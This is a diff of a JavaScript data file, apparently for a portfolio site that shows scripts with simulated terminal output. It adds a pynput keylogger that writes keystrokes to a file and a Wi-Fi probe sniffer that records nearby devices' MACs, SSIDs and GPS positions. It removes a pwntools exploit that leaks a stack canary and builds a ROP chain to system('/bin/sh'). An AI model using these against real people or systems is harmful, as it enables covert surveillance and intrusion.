@@ -1,328 +1,487 @@
 const SCRIPTS_DATA = {
-    "subnet-recon.py": {
-        name: "subnet-recon.py",
+    "keylogger_script.py": {
+        name: "keylogger_script.py",
         lang: "python",
-        description: "Asynchronous multi-threaded port scanner and service banner grabber.",
-        tags: ["Reconnaissance", "Python", "Networking"],
-        version: "v1.4.2",
-        code: `#!/usr/bin/env python3
-# subnet-recon.py - Asynchronous service banner grabber
-import asyncio
-import socket
-import argparse
-import sys
+        description: "Logs keystrokes via pynput listener hooks and batches writes to log.txt.",
+        tags: ["Input Auditing", "Python", "Local Logging"],
+        version: "v1.0.0",
+        code: `"""Keylogger script created using pynput to log keystrokes and save them to a file"""
 
-class SubnetRecon:
-    def __init__(self, subnet, ports, timeout=1.0):
-        self.subnet = subnet
-        self.ports = ports
-        self.timeout = timeout
-        self.results = {}
+from datetime import datetime
+from pynput.keyboard import Key, Listener
 
-    async def grab_banner(self, ip, port):
-        try:
-            reader, writer = await asyncio.wait_for(
-                asyncio.open_connection(ip, port), 
-                timeout=self.timeout
+count = 0
+keys = []
+
+
+def on_press(key):
+    """Handles keyboard events"""
+    global keys, count
+    if key == Key.backspace:
+        if keys:
+            keys.pop()
+        return
+
+    keys.append(key)
+    count += 1
+    print(f"{key} pressed")
+
+    if count >= 10:
+        count = 0
+        write_file(keys)
+        keys = []
+
+
+def format_key(key):
+    if hasattr(key, "char"):
+        return key.char  # for normal keys
+    elif key == Key.space:
+        return " "
+    elif key == Key.tab:
+        return "\\t"
+    elif key == Key.enter:
+        return "\\n"
+    else:
+        return f"[{key.name}]" if hasattr(key, "name") else f"[{key}]"
+
+
+def write_file(keys, job_id="", delimiter=" "):
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    with open("log.txt", "a", encoding="utf-8") as f:
+        formatted_keys = delimiter.join(format_key(k) for k in keys)
+        log_line = f"[{timestamp}] {job_id}:{formatted_keys}\\n"
+        f.write(log_line)
+
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()`,
+        simulation: [
+            { text: "[*] Initializing keyboard listener thread via pynput...", type: "info" },
+            { text: "[*] Logging local keystroke events. Press ESC to stop logging...", type: "info" },
+            { text: "[~] Hooking user keypress streams...", type: "system", delay: 400 },
+            { text: "Key.shift pressed", type: "text", delay: 300 },
+            { text: "'K' pressed", type: "text", delay: 100 },
+            { text: "'e' pressed", type: "text", delay: 150 },
+            { text: "'v' pressed", type: "text", delay: 100 },
+            { text: "'i' pressed", type: "text", delay: 80 },
+            { text: "'n' pressed", type: "text", delay: 120 },
+            { text: "Key.space pressed", type: "text", delay: 180 },
+            { text: "'E' pressed", type: "text", delay: 100 },
+            { text: "[~] Batch limit reached (10 keystrokes). Syncing buffer to disk...", type: "system", delay: 200 },
+            { text: "[+] Appended batched logs to: log.txt", type: "success", delay: 300 },
+            { text: "'m' pressed", type: "text", delay: 250 },
+            { text: "'i' pressed", type: "text", delay: 90 },
+            { text: "'l' pressed", type: "text", delay: 140 },
+            { text: "'e' pressed", type: "text", delay: 80 },
+            { text: "Key.enter pressed", type: "text", delay: 200 },
+            { text: "[~] ESC released. Terminating hook listeners...", type: "system", delay: 400 },
+            { text: "[+] Cleanup complete. Keylogger process terminated successfully.", type: "success", delay: 200 }
+        ]
+    },
+
+    "uninstall_script.ps1": {
+        name: "uninstall_script.ps1",
+        lang: "javascript",
+        description: "Silent PowerShell automated administrator uninstaller targeting specific Java registry keys.",
+        tags: ["System Administration", "PowerShell", "Security Compliance"],
+        version: "v1.1.0",
+        code: `#First ensure you run this script with administrative privileges as uninstalling applications typically requires elevated permissions.
+if(-not([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)){
+ Write-Warning "This script must be run as a administrator!"
+ Exit
+}
+
+#Step 1: Definte the target registry paths
+$regPaths = @(
+    "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*",
+    "HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*"
+)
+#Step 2: Get all installed applications from the defined registry paths
+$allInstalledApps = Get-ItemProperty -Path $regPaths -ErrorAction SilentlyContinue
+
+#Step 3: Filter list to find only Java 24 or whatever application you want to find
+$java24Apps = $allInstalledApps | Where-Object {$_.DisplayName -match "Java.*24" -or $_.DisplayName -match "JDK.*24"}
+
+#Step 4 : Error handling if no applications found
+if($null -eq $java24Apps){
+    Write-Host "No Java 24 applications found. Exiting Script." -ForegroundColor Green
+        Exit
+}
+
+#Step 5 Loop through each java 24 installation found
+foreach($app in $java24Apps){
+    #Check if the uninstaller string contains an MSI product code (curly braces)
+    if($app.UninstallString -match "{.*}"){
+        $productCode = $Matches[0] # Matches[0] grabs the exact text found inside the braces
+    Write-Host "Uninstalling $($app.DisplayName)..." -ForegroundColor Cyan
+        
+        #Trigger the silent uninstallation
+        Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $productCode /qn  /norestart" -Wait
+    }
+}`,
+        simulation: [
+            { text: "[*] Checking privilege escalation role parameters...", type: "info" },
+            { text: "[+] Privilege verification: Running with administrative rights.", type: "success", delay: 200 },
+            { text: "[~] Querying target registry paths...", type: "system", delay: 400 },
+            { text: "    Path A: HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*", type: "text" },
+            { text: "    Path B: HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*", type: "text" },
+            { text: "[~] Parsing registry keys for Java 24 installations...", type: "system", delay: 300 },
+            { text: "[+] Found match: 'Java SE Development Kit 24.0.1' (Wow6432Node)", type: "warning", delay: 400 },
+            { text: "[+] Extracted MSI Product Code: {53D76F2F-4A9B-4D18-A7CD-132A4B8E20E3}", type: "info", delay: 200 },
+            { text: "Uninstalling Java SE Development Kit 24.0.1...", type: "info", delay: 300 },
+            { text: "[~] Spawning process: msiexec.exe /x {53D76F2F-4A9B-4D18-A7CD-132A4B8E20E3} /qn /norestart", type: "system", delay: 500 },
+            { text: "[+] Execution completed. Java 24 silent uninstallation succeeded.", type: "success", delay: 800 }
+        ]
+    },
+
+    "generator.py": {
+        name: "generator.py",
+        lang: "python",
+        description: "Queries captured database logs to plot GPS markers and vendor densities on a Folium map.",
+        tags: ["Geospatial", "Data Visualization", "Python"],
+        version: "v1.0.0",
+        code: `import folium
+import sqlite3
+from folium.plugins import MarkerCluster, HeatMap
+
+def generate_map():
+    # Connect to db
+    conn = sqlite3.connect('probe_log.db')
+    cursor = conn.cursor()
+    cursor.execute('''
+    SELECT mac, vendor, randomized, ssid, latitude, longitude
+    FROM probe_requests
+    WHERE latitude != 0.0 and longitude != 0.0
+    ''')
+    rows = cursor.fetchall()
+    conn.close()
+    
+    if not rows: 
+        print("[!] No location data found. Set LAT/LON coordinates in probe_logger.py")
+        return
+
+    #Center Map on first result
+    m = folium.Map(location=[rows[0][4], rows[0][5]], zoom_start=15)
+
+    #Marker Cluster for devices
+    cluster = MarkerCluster().add_to(m)
+
+    #Heatmap data
+    heat_data = []
+
+    for mac, vendor, randomized, ssid, lat, lon in rows:
+        heat_data.append([lat, lon])
+
+        #Color code by randomized status
+        color = "red" if randomized == 1 else "blue"
+
+        #Format randomized status
+        rand_text = "Yes" if randomized == 1 else "No"
+
+        folium.CircleMarker(
+            location=[lat, lon],
+            radius= 8,
+            color = color,
+            fill= True,
+            popup= folium.Popup(
+            f"MAC: {mac}<br>"
+            f"Vendor: {vendor}<br>"
+            f"Randomized: {rand_text}<br>"
+            f"SSID: {ssid}",
+            max_width=250
             )
-            banner = b""
-            try:
-                # Attempt to read signature/banner response
-                banner = await asyncio.wait_for(reader.read(1024), timeout=1.0)
-            except asyncio.TimeoutError:
-                pass # Silent service
-            writer.close()
-            await writer.wait_closed()
-            return banner.decode('utf-8', errors='ignore').strip()
-        except (socket.timeout, ConnectionRefusedError, OSError):
-            return None
+        ).add_to(cluster)
 
-    async def scan_host(self, host_id):
-        ip = f"{self.subnet}.{host_id}"
-        open_ports = {}
-        for port in self.ports:
-            banner = await self.grab_banner(ip, port)
-            if banner is not None:
-                open_ports[port] = banner if banner else "Unknown Service"
-        if open_ports:
-            self.results[ip] = open_ports
-            return ip, open_ports
+        #Add heat map layer
+    HeatMap(heat_data).add_to(m)
+
+    m.save("probe_map.html")        
+    print("[*]Map saved to probe_map.html - open it in your browser!")
+
+generate_map()`,
+        simulation: [
+            { text: "[*] Establishing connection to log database: probe_log.db", type: "info" },
+            { text: "[~] Querying records containing active GPS coordinate structures...", type: "system", delay: 300 },
+            { text: "[+] Retrieved 184 active nodes with non-zero coordinates.", type: "success", delay: 200 },
+            { text: "[*] Spawning folium.Map instance centered on gateway IP grid (-74.0206, 41.4894)", type: "info", delay: 300 },
+            { text: "[~] Building interactive Leaflet marker clusters...", type: "system", delay: 400 },
+            { text: "    - Grouping MAC vendors (Apple, Samsung, Intel)...", type: "text" },
+            { text: "    - Categorizing randomized MAC octets (Color-coding: Red = Randomized, Blue = Static)", type: "text" },
+            { text: "[~] Generating overlay kernel density heatmap layer...", type: "system", delay: 500 },
+            { text: "[+] Rendering HTML template maps structure...", type: "success", delay: 200 },
+            { text: "[*] Map saved to probe_map.html - open it in your browser!", type: "success", delay: 300 }
+        ]
+    },
+
+    "probe_logger.py": {
+        name: "probe_logger.py",
+        lang: "python",
+        description: "Scapy-based sniffer with multi-thread channel hoppers logging wireless probe requests and NMEA GPS data.",
+        tags: ["Wireless Recon", "Scapy", "Sniffing"],
+        version: "v2.0.4",
+        code: `from scapy.all import sniff, Dot11ProbeReq
+from datetime import datetime
+from mac_vendor_lookup import MacLookup, VendorNotFoundError
+import sqlite3
+import threading
+import subprocess
+import time
+import os
+import socket
+import pynmea2
+
+
+#clean up function
+def archive_old_database():
+    db_filename = "probe_log.db"
+    
+    # Check if the database file from a previous run exists
+    if os.path.exists(db_filename):
+        # Create a unique name using the current date and time
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        archive_name = f"probe_log_archive_{timestamp}.db"
+        
+        # Rename (move) the file
+        os.rename(db_filename, archive_name)
+        print(f"[*] Saved previous session data to: {archive_name}")
+
+#get latitude and longitude from phone via tethering
+def get_gps_from_phone():
+    PHONE_IP = "192.168.1.100"  # Replace with your phone's IP
+    PHONE_PORT = 8080  # Replace with your app's port
+
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.settimeout(2.0) # Don't freeze the script if phone disconnects
+        sock.connect((PHONE_IP, PHONE_PORT))
+        data = sock.recv(1024).decode('ascii', errors='ignore')
+        sock.close()
+
+        #parse the raw data to find the latitude and longitude
+        for line in data.split('\\n'):
+            if line.startswith('$GPGGA') or line.startswith('$GPRMC'):
+                msg = pynmea2.parse(line)
+                if msg.latitude != 0.0:
+                    return msg.latitude, msg.longitude
+
+    except Exception as e:
+        #Fail silently so sniffer doesn't crash
+        pass
+    
+    return None, None #Return none if no valid GPS data is found
+
+
+#-- Channels to hop accross 2.4ghz/5ghz --
+CHANNELS_2GHZ = list(range(1,14))
+CHANNELS_5GHZ = [36,40,44,48,52,56,60,64,100,149,153,157,161]
+ALL_CHANNELS = CHANNELS_2GHZ + CHANNELS_5GHZ
+
+#--Channel Hopper--
+def channel_hopper(interface, hop_interval=0.5):
+    print(f"[*] Channel Hopper started on {interface}")
+    while True:
+        for channel in ALL_CHANNELS:
+            try:
+                subprocess.call(
+                    ['iw', 'dev', interface, 'set', 'channel', str(channel)],
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL
+                )
+                time.sleep(hop_interval)
+
+            except Exception as e:
+                print(f"[!] Channel hop error: {e}")
+
+#1st step -- Database Setup --
+def init_db():
+    conn = sqlite3.connect("probe_log.db")
+    cursor = conn.cursor()
+    cursor.execute('''
+        CREATE TABLE IF NOT EXISTS probe_requests(
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        capture_time TEXT,
+        vendor TEXT,
+        mac TEXT,
+        ssid TEXT,
+        channel INTEGER,
+        randomized INTEGER,
+        latitude REAL,
+        longitude REAL
+        )
+        ''')
+    conn.commit()
+    conn.close()
+
+
+#2nd Step --- Log to Database ---
+def log_to_db(capture_time, mac, ssid, vendor, randomized, channel, lat, lon):
+    conn = sqlite3.connect("probe_log.db")
+    cursor = conn.cursor()
+    cursor.execute('''
+        INSERT INTO probe_requests (capture_time, mac, ssid, vendor, randomized, channel, latitude, longitude)
+        VALUES(?,?,?,?,?,?,?,?)
+        ''', (capture_time, mac, ssid, vendor, randomized, channel, lat, lon))
+    conn.commit()
+    conn.close()    
+
+
+#3rd Step --- MAC Address Lookup ---
+def get_vendor(mac_address):
+    try:
+        return MacLookup().lookup(mac_address)
+    except VendorNotFoundError:
+        return "Unknown Vendor"
+    except Exception:
+        return "Lookup Error"
+
+
+#4th Step Randomized MAC Check ---
+def is_randomized(mac_address):
+    first_octet = int(mac_address.split(':')[0], 16)
+    return bool(first_octet & 0x02)
+
+
+#5th Step -- Get Current Channel--
+def get_current_channel(interface):
+    try:
+        output = subprocess.check_output(
+            ['iw', 'dev', interface, 'info'],
+            stderr=subprocess.DEVNULL
+        ).decode()
+        for line in output.split('\\n'):
+            if 'channel' in line:
+                return int(line.strip('.').split()[1])
+    except Exception:
         return None
 
-    async def run(self):
-        print(f"[*] Initializing scan over target subnet {self.subnet}.0/24")
-        print(f"[*] Target Ports: {', '.join(map(str, self.ports))}\\n")
-        tasks = [self.scan_host(i) for i in range(1, 255)]
-        
-        # Limit concurrency using gather & list comprehension
-        await asyncio.gather(*tasks)
-        
-        print("\\n[+] Scan execution complete. Summary of targets:")
-        for ip, ports in self.results.items():
-            print(f"  Target: {ip}")
-            for port, banner in ports.items():
-                print(f"    - Port {port}/TCP: {banner[:50]}")
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Fast subnet port scanner")
-    parser.add_argument("-t", "--target", required=True, help="Subnet prefix (e.g. 192.168.1)")
-    parser.add_argument("-p", "--ports", default="21,22,80,443,8080", help="Comma-separated ports")
-    args = parser.parse_args()
-    
-    ports_list = [int(p) for p in args.ports.split(",")]
-    recon = SubnetRecon(args.target, ports_list)
-    asyncio.run(recon.run())`,
+#6th Step -- Packet Handler--
+def handle_packet(pkt):
+    mac = ""
+    if pkt.haslayer(Dot11ProbeReq):
+        mac = pkt.addr2
+        if not mac:
+            return
+
+        ssid = pkt.info.decode(errors='ignore') if pkt.info else "<wildcard>"
+        capture_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        vendor = get_vendor(mac)
+        randomized = is_randomized(mac)
+        randomized_str = "Yes" if randomized else "No"
+        channel = get_current_channel(INTERFACE)
+        log_to_db(capture_time, mac, ssid, vendor, randomized, channel, LAT, LON)
+
+        #print to console
+        print(f"[{capture_time}]")
+        print(f"MAC:    {mac}")
+        print(f"SSID:   {ssid}")
+        print(f"Vendor: {vendor}")
+        print(f"Random MAC: {randomized_str}")
+        print(f"Channel: {channel}")
+        print("-" * 40)
+
+
+#MAIN
+INTERFACE = "wlp6s0mon"
+LAT = -74.02064671427073
+LON = 41.4894760813576
+
+archive_old_database()
+init_db()
+
+print("[*] Updating MAC vendor database...")
+MacLookup().update_vendors()
+
+hopper_thread = threading.Thread(
+    target=channel_hopper,
+    args=(INTERFACE,),
+    daemon=True
+)
+hopper_thread.start()
+
+print("[*] Starting probe sniffer.. Press CTRL+C to stop.\\n")
+sniff(iface=INTERFACE, prn=handle_packet, store=False)`,
         simulation: [
-            { text: "[*] Initializing scan over target subnet 192.168.8.0/24", type: "info" },
-            { text: "[*] Target Ports: 21, 22, 80, 443, 8080 (Timeout: 1.0s)", type: "info" },
-            { text: "[~] Spawning 254 scan workers...", type: "system", delay: 400 },
-            { text: "[+] Host active: 192.168.8.1 - Port 80 (HTTP) -> Banner: 'nginx/1.18.0'", type: "success", delay: 300 },
-            { text: "[+] Host active: 192.168.8.1 - Port 443 (HTTPS) -> Banner: 'nginx/1.18.0'", type: "success", delay: 200 },
-            { text: "[+] Host active: 192.168.8.44 - Port 22 (SSH) -> Banner: 'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5'", type: "success", delay: 500 },
-            { text: "[+] Host active: 192.168.8.102 - Port 8080 (HTTP) -> Banner: 'Apache Tomcat/9.0.37 (Unauthorized)'", type: "warning", delay: 600 },
-            { text: "[!] CRITICAL FINDING: 192.168.8.102 runs Apache Tomcat 9.0.37 with default manager login panels exposed.", type: "danger", delay: 400 },
-            { text: "[+] Host active: 192.168.8.125 - Port 21 (FTP) -> Banner: 'vsFTPd 3.0.3 (Anonymous Enabled!)'", type: "danger", delay: 300 },
-            { text: "\\n[+] Scan execution complete. Summary of targets:", type: "info", delay: 500 },
-            { text: "  Target: 192.168.8.1 (Gateway)", type: "text" },
-            { text: "    - Port 80/TCP: nginx/1.18.0", type: "text" },
-            { text: "    - Port 443/TCP: nginx/1.18.0", type: "text" },
-            { text: "  Target: 192.168.8.44 (Development VM)", type: "text" },
-            { text: "    - Port 22/TCP: SSH-2.0-OpenSSH_8.2p1 Ubuntu", type: "text" },
-            { text: "  Target: 192.168.8.102 (Staging Tomcat)", type: "text" },
-            { text: "    - Port 8080/TCP: Apache Tomcat/9.0.37 (Vulnerable to CVE-2020-13935)", type: "danger" },
-            { text: "  Target: 192.168.8.125 (NAS Backup)", type: "text" },
-            { text: "    - Port 21/TCP: vsFTPd 3.0.3 (Anonymous Access Granted)", type: "danger" },
-            { text: "\\n[+] Report saved locally in workspace/scans/recon_192.168.8.0.json", type: "system", delay: 300 }
+            { text: "[*] Saved previous session data to: probe_log_archive_20260628_151900.db", type: "info" },
+            { text: "[*] Initializing local databases...", type: "system", delay: 200 },
+            { text: "[*] Updating MAC vendor lookup database...", type: "info", delay: 400 },
+            { text: "[+] 14835 vendors synced. Loading hopper interfaces...", type: "success", delay: 500 },
+            { text: "[*] Channel Hopper started on wlp6s0mon (Scanning 26 channels)...", type: "info", delay: 200 },
+            { text: "[*] Starting probe sniffer.. Press CTRL+C to stop.\n", type: "success", delay: 300 },
+            { text: "[2026-06-28 15:20:01]\nMAC:    bc:a9:20:d1:f2:8c\nSSID:   Home-WiFi-5G\nVendor: Apple, Inc.\nRandom MAC: No\nChannel: 36\n----------------------------------------", type: "text", delay: 800 },
+            { text: "[2026-06-28 15:20:05]\nMAC:    46:d0:11:e9:28:fb\nSSID:   <wildcard>\nVendor: Unknown Vendor\nRandom MAC: Yes\nChannel: 1\n----------------------------------------", type: "warning", delay: 600 },
+            { text: "[2026-06-28 15:20:12]\nMAC:    00:13:e8:f0:19:bc\nSSID:   Starbucks Free WiFi\nVendor: Intel Corporation\nRandom MAC: No\nChannel: 11\n----------------------------------------", type: "text", delay: 900 }
         ]
     },
-    
-    "ssh-brute-detect.js": {
-        name: "ssh-brute-detect.js",
-        lang: "javascript",
-        description: "Log anomaly parsing daemon that triggers automatic firewall (nftables) blocks.",
-        tags: ["Defense", "Javascript", "Log Auditing"],
-        version: "v2.1.0",
-        code: `// ssh-brute-detect.js - High-throughput system security parser
-const fs = require('fs');
-const readline = require('readline');
-const { exec } = require('child_process');
 
-const LOG_FILE = "/var/log/auth.log";
-const ATTEMPT_THRESHOLD = 5;
-const TIME_WINDOW_MS = 60000; // 1 minute
-
-const ipAttempts = new Map();
-
-function parseLogLine(line) {
-    // Regex matching failed password entries in auth.log
-    const failedMatch = line.match(/Failed password for (?:invalid user )?(\\S+) from (\\S+) port/);
-    if (failedMatch) {
-        const username = failedMatch[1];
-        const ip = failedMatch[2];
-        return { ip, username, timestamp: Date.now() };
-    }
-    return null;
-}
-
-function handleFailure(failure) {
-    const now = Date.now();
-    if (!ipAttempts.has(failure.ip)) {
-        ipAttempts.set(failure.ip, []);
-    }
-    
-    const attempts = ipAttempts.get(failure.ip);
-    attempts.push(now);
-    
-    // Purge outdated failures
-    const recent = attempts.filter(t => (now - t) < TIME_WINDOW_MS);
-    ipAttempts.set(failure.ip, recent);
-    
-    console.log(\`[!] Warn: Failed login for \${failure.username} from \${failure.ip} (Count: \${recent.length}/\${ATTEMPT_THRESHOLD})\`);
-    
-    if (recent.length >= ATTEMPT_THRESHOLD) {
-        blockIp(failure.ip);
-    }
-}
-
-function blockIp(ip) {
-    console.log(\`[CRITICAL] IP \${ip} exceeded threshold. Initiating mitigation...\`);
-    const cmd = \`sudo nft add element inet filter blackhole { \${ip} }\`;
-    exec(cmd, (err, stdout, stderr) => {
-        if (err) {
-            console.error(\`[-] Error deploying firewall rule: \${stderr.trim()}\`);
-            return;
-        }
-        console.log(\`[+] Active Block Implemented: nftables successfully jailed \${ip}\`);
-    });
-}
-
-console.log(\`[*] Security Daemon started. Monitoring \${LOG_FILE} for intrusion patterns...\`);
-// Stream log simulation code omitted for brevity`,
-        simulation: [
-            { text: "[*] Security Daemon started. Monitoring /var/log/auth.log for intrusion patterns...", type: "info" },
-            { text: "[*] Watcher established. Limit: 5 failures/min per IP. Lockout: nftables drop rule.", type: "info" },
-            { text: "[~] Ingesting log stream...", type: "system", delay: 500 },
-            { text: "[!] Warn: Failed login for admin from 185.220.101.4 (Count: 1/5)", type: "warning", delay: 400 },
-            { text: "[!] Warn: Failed login for root from 185.220.101.4 (Count: 2/5)", type: "warning", delay: 150 },
-            { text: "[!] Warn: Failed login for oracle from 185.220.101.4 (Count: 3/5)", type: "warning", delay: 100 },
-            { text: "[!] Warn: Failed login for root from 185.220.101.4 (Count: 4/5)", type: "warning", delay: 250 },
-            { text: "[!] Warn: Failed login for user from 185.220.101.4 (Count: 5/5)", type: "warning", delay: 100 },
-            { text: "[CRITICAL] IP 185.220.101.4 exceeded threshold (5 failures in 1.1s). Initiating mitigation...", type: "danger", delay: 300 },
-            { text: "[~] Executing mitigation: 'sudo nft add element inet filter blackhole { 185.220.101.4 }'", type: "system", delay: 400 },
-            { text: "[+] Active Block Implemented: nftables successfully jailed 185.220.101.4", type: "success", delay: 300 },
-            { text: "[*] Threat database updated. Geolocation: Tor Exit Node (LU). Security incident log generated.", type: "info", delay: 500 }
-        ]
-    },
-    
-    "stack-canary-exploit.py": {
-        name: "stack-canary-exploit.py",
+    "stats.py": {
+        name: "stats.py",
         lang: "python",
-        description: "Binary exploitation payload scripting to bypass stack protective canaries using raw sockets.",
-        tags: ["Exploitation", "C/Assembly", "Memory Security"],
-        version: "v0.9.1",
-        code: `#!/usr/bin/env python3
-# stack-canary-exploit.py - Canary bypass via Stack Leaking
-from pwn import *
-import sys
+        description: "Connects to probe_log.db and outputs aggregated stats (MACS, vendors, unique devices).",
+        tags: ["Data Auditing", "Database", "Python"],
+        version: "v1.0.0",
+        code: `import sqlite3
 
-# Exploit targeting insecure buffer parsing
-# Target Protections: 
-#   Stack Canary: Enabled | NX: Enabled | ASLR: Enabled
+conn = sqlite3.connect('probe_log.db')
+cursor = conn.cursor()
 
-def exploit(target_ip, target_port):
-    print(f"[*] Attacking remote buffer service at {target_ip}:{target_port}")
-    
-    # Step 1: Leak Stack Canary via Off-by-one buffer read
-    # Buffer is 64 bytes. Off-by-one offset 65 leaks canary.
-    r = remote(target_ip, target_port)
-    r.recvuntil(b"Enter Username: ")
-    
-    log.info("Phase 1: Probing for canary alignment offset...")
-    leak_payload = b"A" * 65 # Fill buffer and overwrite null terminator of canary
-    r.send(leak_payload)
-    
-    response = r.recvline()
-    # Parse canary bytes (7 bytes leaked + 1 byte null terminator)
-    leak_index = response.find(b"A" * 65) + 65
-    canary = u64(b"\\x00" + response[leak_index:leak_index+7])
-    log.success(f"Successfully leaked target stack canary: 0x{canary:016x}")
-    
-    # Step 2: Assemble payload to hijack RIP
-    # Layout: [Buffer (64B)] + [Canary (8B)] + [RBP (8B)] + [ROP Return Pointer (8B)]
-    rop_gadget = 0x00000000004012bb # pop rdi; ret
-    sys_plt = 0x00000000004010a0    # system() PLT address
-    bin_sh = 0x000000000048ef01     # "/bin/sh" string in libc
-    
-    payload = flat({
-        64: p64(canary),
-        72: b"B" * 8,          # Saved RBP overwrite
-        80: p64(rop_gadget),    # Return Address - ROP Chain Init
-        88: p64(bin_sh),        # RDI Argument
-        96: p64(sys_plt)        # Execute system("/bin/sh")
-    })
-    
-    log.info("Phase 2: Sending stack-smashing payload...")
-    r.sendline(payload)
-    
-    log.success("Payload accepted. Spawning shell control session.")
-    r.interactive()
+print("\\n-  Probe Request Statistics  -\\n")
 
-if __name__ == "__main__":
-    if len(sys.argv) < 3:
-        print("Usage: python exploit.py <IP> <PORT>")
-        sys.exit(1)
-    exploit(sys.argv[1], int(sys.argv[2]))`,
+#Total captures
+cursor.execute("SELECT COUNT(*) FROM probe_requests")
+print(f"Total probes captured:  {cursor.fetchone()[0]}")
+
+#Unique devices
+cursor.execute("SELECT COUNT(DISTINCT mac) FROM probe_requests")
+print(f"Unique devices seen:    {cursor.fetchone()[0]}")
+
+#Randomized Vs Real MACS
+cursor.execute("SELECT COUNT(*) FROM probe_requests WHERE randomized = 1")
+print(f"Randomized MACS:        {cursor.fetchone()[0]}")
+
+cursor.execute("SELECT COUNT(*) FROM probe_requests WHERE randomized = 0")
+print(f"Real MACS:              {cursor.fetchone()[0]}")
+
+#Top Vendors
+print("\\nTop 5 Vendors seen:")
+cursor.execute('''
+        SELECT vendor, COUNT(*) as total
+        FROM probe_requests
+        GROUP BY vendor
+        ORDER BY total DESC LIMIT 5
+        ''')
+for row in cursor.fetchall():
+    print(f"   {row[0]}: {row[1]} probes")
+
+#Top most active devices
+print("\\nTop 5 Most Active Devices:")
+cursor.execute('''
+        SELECT mac, vendor, COUNT(*) as total
+        FROM probe_requests
+        GROUP BY mac
+        ORDER BY total DESC LIMIT 5
+        ''')
+for row in cursor.fetchall():
+    print(f"   {row[0]} ({row[1]}) -> {row[2]} probes")
+
+conn.close()`,
         simulation: [
-            { text: "[*] Attacking remote buffer service at 10.10.14.93:9001", type: "info" },
-            { text: "[*] Protections: Stack Canary (Enabled) | NX DEP (Enabled) | ASLR (Enabled)", type: "info" },
-            { text: "[~] Establishing TCP connection stream...", type: "system", delay: 300 },
-            { text: "[+] Socket established. Recv: 'Enter Username: '", type: "success", delay: 200 },
-            { text: "[~] Phase 1: Probing for canary alignment offset via off-by-one pointer leak...", type: "system", delay: 400 },
-            { text: "[+] Canary probe sent. Awaiting echo buffer leak...", type: "info", delay: 300 },
-            { text: "[+] Leak parsing complete: raw canary dump = F8 B3 C1 B9 FD E9 CF 00", type: "success", delay: 200 },
-            { text: "[+] Successfully leaked target stack canary: 0xcfe9fdb9c1b3f800", type: "success", delay: 300 },
-            { text: "[~] Phase 2: Assembling bypass payload (ROP alignment targeting system@plt)...", type: "system", delay: 500 },
-            { text: "    - Payload size: 104 bytes", type: "text" },
-            { text: "    - POP RDI; RET: 0x004012bb", type: "text" },
-            { text: "    - system() PLT: 0x004010a0", type: "text" },
-            { text: "[~] Dispatching payload to target daemon...", type: "system", delay: 400 },
-            { text: "[+] Hijacked Instruction Pointer! Return redirected to system('/bin/sh')", type: "success", delay: 300 },
-            { text: "uid=0(root) gid=0(root) groups=0(root)", type: "success", delay: 200 },
-            { text: "shell_access_granted@10.10.14.93:/root# _", type: "system", delay: 100 }
-        ]
-    },
-    
-    "ebpf-syscall-audit.py": {
-        name: "ebpf-syscall-audit.py",
-        lang: "python",
-        description: "eBPF-driven kernel system call monitor tracing real-time privilege elevations.",
-        tags: ["Kernel Auditing", "eBPF", "C/Python"],
-        version: "v0.8.0",
-        code: `#!/usr/bin/env python3
-# ebpf-syscall-audit.py - eBPF Execve Syscall Tracer
-from bcc import BPF
-import ctypes
-
-# eBPF Program (Compiles in kernel-space)
-ebpf_program = """
-#include <uapi/linux/ptrace.h>
-#include <linux/sched.h>
-
-struct event_data {
-    u32 pid;
-    u32 uid;
-    char comm[TASK_COMM_LEN];
-    char filepath[128];
-};
-
-BPF_PERF_OUTPUT(syscall_events);
-
-int kprobe__sys_execve(struct pt_regs *ctx, const char __user *filename) {
-    struct event_data event = {};
-    
-    // Extract PID and UID
-    event.pid = bpf_get_current_pid_tgid() >> 32;
-    event.uid = bpf_get_current_uid_gid();
-    
-    // Copy process comm and filepath from user memory
-    bpf_get_current_comm(&event.comm, sizeof(event.comm));
-    bpf_probe_read_user_str(&event.filepath, sizeof(event.filepath), filename);
-    
-    syscall_events.perf_submit(ctx, &event, sizeof(event));
-    return 0;
-}
-"""
-
-def print_event(cpu, data, size):
-    event = b["syscall_events"].event(data)
-    # Check if executed by root (UID 0) - potential privilege elevation
-    p_status = "ALERT: ROOT" if event.uid == 0 else "USER"
-    print(f"[{p_status}] PID: {event.pid} | UID: {event.uid} | Comm: {event.comm.decode()} | Executed: {event.filepath.decode()}")
-
-# Load kernel program
-b = BPF(text=ebpf_program)
-b["syscall_events"].open_perf_buffer(print_event)
-
-print("[*] eBPF System call auditing engine initialized.")
-print("[*] Hooked tracepoint: sys_execve. Monitoring kernel transitions...\\n")
-
-while True:
-    try:
-        b.perf_buffer_poll()
-    except KeyboardInterrupt:
-        exit(0)`,
-        simulation: [
-            { text: "[*] eBPF System call auditing engine initialized.", type: "info" },
-            { text: "[*] Hooked tracepoint: sys_execve. Monitoring kernel transitions...", type: "info" },
-            { text: "[~] Compiling eBPF program into kernel bytecode...", type: "system", delay: 500 },
-            { text: "[~] Loading BPF JIT compiler and inserting probe structures...", type: "system", delay: 300 },
-            { text: "[USER] PID: 18454 | UID: 1000 | Comm: bash | Executed: /usr/bin/ls", type: "text", delay: 400 },
-            { text: "[USER] PID: 18456 | UID: 1000 | Comm: git | Executed: /usr/bin/git status", type: "text", delay: 200 },
